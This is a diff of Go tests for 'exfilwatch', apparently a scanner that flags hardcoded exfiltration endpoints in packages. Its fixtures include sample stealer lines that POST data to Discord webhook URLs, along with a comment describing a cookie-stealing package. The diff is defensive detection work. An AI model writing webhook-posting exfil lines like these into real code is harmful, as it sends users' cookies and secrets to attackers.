@@ -197,6 +197,84 @@ func TestScanBytes_HostMatchIsCaseInsensitive(t *testing.T) {
 	}
 }
 
+func TestScan_HitOnDiscordWebhook(t *testing.T) {
+	// Discord webhooks are the canonical gaming/cookie-stealer exfil
+	// channel: the spadata PyPI stealer (June 2026) POSTed a decrypted
+	// .ROBLOSECURITY cookie to a hardcoded discord.com/api/webhooks URL.
+	// A webhook URL with an embedded id+token in published library
+	// source is an exfil sink with no legitimate hardcoded purpose.
+	dir := t.TempDir()
+	content := "package x\nfunc init() { post(\"https://discord.com/api/webhooks/1501511921185325186/AbC-def\") }\n"
+	if err := os.WriteFile(filepath.Join(dir, "init.go"), []byte(content), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	hits, err := exfilwatch.Scan(dir)
+	if err != nil {
+		t.Fatalf("Scan: %v", err)
+	}
+	if len(hits) != 1 {
+		t.Fatalf("want 1 hit, got %d: %+v", len(hits), hits)
+	}
+	if hits[0].Host != "discord.com/api/webhooks" {
+		t.Errorf("got host %q, want discord.com/api/webhooks", hits[0].Host)
+	}
+}
+
+func TestScanBytes_HitOnLegacyDiscordAppWebhook(t *testing.T) {
+	// discordapp.com is Discord's legacy domain — still live and used by
+	// older stealers. It does NOT contain the substring "discord.com"
+	// (the "app" breaks it), so it needs its own Hosts entry rather than
+	// riding the discord.com/api/webhooks one.
+	hits := exfilwatch.ScanBytes("steal.py", []byte("requests.post('https://discordapp.com/api/webhooks/123/tok', json=payload)\n"))
+	if len(hits) != 1 {
+		t.Fatalf("want 1 hit, got %d: %+v", len(hits), hits)
+	}
+	if hits[0].Host != "discordapp.com/api/webhooks" {
+		t.Errorf("got host %q, want discordapp.com/api/webhooks", hits[0].Host)
+	}
+}
+
+func TestScan_DiscordAPINonWebhookNotMatched(t *testing.T) {
+	// Precision guard: the Hosts entry is the /api/webhooks/ delivery
+	// path, NOT bare discord.com. A legitimate Discord API client
+	// (discord.com/api/v10/...) must not hit — otherwise every Discord
+	// library wrapper would false-positive, breaking exfilwatch's "a
+	// literal hit is a strong malware signal" contract.
+	dir := t.TempDir()
+	content := "var u = \"https://discord.com/api/v10/users/@me\"\n"
+	if err := os.WriteFile(filepath.Join(dir, "x.go"), []byte(content), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	hits, err := exfilwatch.Scan(dir)
+	if err != nil {
+		t.Fatalf("Scan: %v", err)
+	}
+	if len(hits) != 0 {
+		t.Fatalf("want 0 hits for non-webhook Discord API, got %d: %+v", len(hits), hits)
+	}
+}
+
+func TestScanReader_StreamsHitsWithoutBuffering(t *testing.T) {
+	// ScanReader is the streaming entry point the artifact walker uses:
+	// it scans an io.Reader (a bounded archive entry body) for host
+	// literals without the caller first buffering the whole file into a
+	// []byte the way ScanBytes requires.
+	r := strings.NewReader("import os\nrequests.post('https://discord.com/api/webhooks/1/t')\n")
+	hits := exfilwatch.ScanReader("spadata/__init__.py", r)
+	if len(hits) != 1 {
+		t.Fatalf("want 1 hit, got %d: %+v", len(hits), hits)
+	}
+	if hits[0].Host != "discord.com/api/webhooks" {
+		t.Errorf("got host %q, want discord.com/api/webhooks", hits[0].Host)
+	}
+	if hits[0].File != "spadata/__init__.py" {
+		t.Errorf("got file %q, want spadata/__init__.py", hits[0].File)
+	}
+	if hits[0].Line != 2 {
+		t.Errorf("got line %d, want 2", hits[0].Line)
+	}
+}
+
 func TestHosts_NonEmptyAndContainsWebhookSite(t *testing.T) {
 	if len(exfilwatch.Hosts) == 0 {
 		t.Fatal("Hosts is empty")
